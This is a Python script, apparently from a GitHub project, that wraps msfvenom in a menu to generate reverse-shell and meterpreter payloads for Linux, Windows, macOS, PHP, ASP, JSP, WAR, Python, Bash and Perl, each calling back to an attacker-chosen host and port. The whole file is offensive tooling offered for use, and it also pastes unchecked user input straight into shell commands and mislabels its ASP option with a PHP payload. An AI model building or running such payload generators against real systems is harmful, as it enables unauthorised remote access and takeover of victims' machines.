import os
import pyfiglet as fig
from termcolor import colored

os.system("clear")

title = fig.figlet_format(" M S F  \nP A Y  \nG E N ", font = "slant")
print(title)
print(colored("]-- github.com/rootkral4 --[\n", "green"))
print(colored("Msfvenom Payload Generator", "magenta"))
print(colored("-" * 25, "cyan"),colored("\n 1 : Linux Payload", "cyan"),colored("\n 2 : Windows Payload", "cyan"),colored("\n 3 : Mac Payload", "cyan"),colored("\n 4 : Php Payload", "cyan"),colored("\n 5 : Asp Payload", "cyan"),colored("\n 6 : JSP Payload", "cyan"),colored("\n 7 : War Payload", "cyan"),colored("\n 8 : Python Payload", "cyan"),colored("\n 9 : Bash Payload", "cyan"),colored("\n 0 : Perl Payload", "cyan"),"\n" + colored("-" * 25, "cyan"))
choice = input(colored("Your Selection :", "yellow"))
if choice == "1":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf > payload.elf")
		print(colored("Created ! payload.elf\n", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "2":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe > payload.exe")
		print(colored("Created ! payload.exe", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "3":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f macho > payload.macho")
		print(colored("Created ! payload.macho", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "4":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.php")
		print(colored("Created ! payload.php", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "5":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f asp > payload.asp")
		print(colored("Created ! payload.asp", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "6":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.jsp")
		print(colored("Created ! payload.jsp", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "7":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f war > payload.war")
		print(colored("Created ! payload.war", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "8":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_python LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.py")
		print(colored("Created ! payload.py", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "9":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_bash LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.sh")
		print(colored("Created ! payload.sh", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "0":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "white"))
		lport = input(colored("LPORT (e.g. 4444):", "white"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_perl LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.pl")
		print(colored("Created ! payload.pl", "green"))
		print(colored("If you liked the tool, don't forget to follow my github page :)", "white"))
	except:
		print(colored("Failed !", "red"))
		pass
